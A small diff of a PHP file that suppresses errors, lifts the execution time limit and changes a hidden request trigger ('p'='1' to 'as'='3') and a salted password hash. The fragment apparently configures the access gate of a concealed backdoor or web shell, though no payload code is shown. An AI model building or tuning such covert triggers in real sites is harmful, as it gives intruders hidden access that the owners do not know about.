@@ -8,10 +8,10 @@ error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('display_errors', 0);
 
-$trigger_key = 'p';
-$trigger_val = '1';
+$trigger_key = 'as';
+$trigger_val = '3';
 
-$hash_legacy = 'a45d926a66c7bc36934b3fb61e12a60e86ee44190c4df8ca0d4213501d749a66e19d016e9bcc0ba5432d6f6d0a26cc10b9e484f4106a708b88aba49e7403ed7d';
+$hash_legacy = 'd62aae6a70d91fe7e3085fe591c51ce5b796bc7b215e0fd604cbb2d87c3ce03454474910e97b956eeb6aa8be07ee9e435b70c06bfa854855e9756a4cddb6dfa0';
 $salt_legacy = 'RjL';
 
 $max_tries = 5;
